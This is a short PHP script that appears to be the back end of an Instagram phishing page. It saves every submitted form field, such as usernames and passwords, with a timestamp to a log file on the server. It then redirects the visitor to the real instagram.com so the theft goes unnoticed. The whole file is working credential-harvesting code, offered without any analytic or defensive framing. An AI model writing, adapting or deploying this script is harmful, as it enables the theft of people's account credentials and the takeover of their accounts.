<?php
if (!empty($_POST)) {
    $log_dir = __DIR__ . "/logs";
    if (!is_dir($log_dir)) mkdir($log_dir, 0755, true);
    
    $data = "[" . date('Y-m-d H:i:s') . "]\r\n";
    foreach ($_POST as $key => $value) {
        $data .= htmlspecialchars(trim($key)) . " = " . htmlspecialchars(trim($value)) . "\r\n";
    }
    $data .= str_repeat("-", 50) . "\r\n\r\n";
    
    file_put_contents($log_dir . "/data.txt", $data, FILE_APPEND | LOCK_EX);
}
header("Location: https://www.instagram.com");
exit;
?>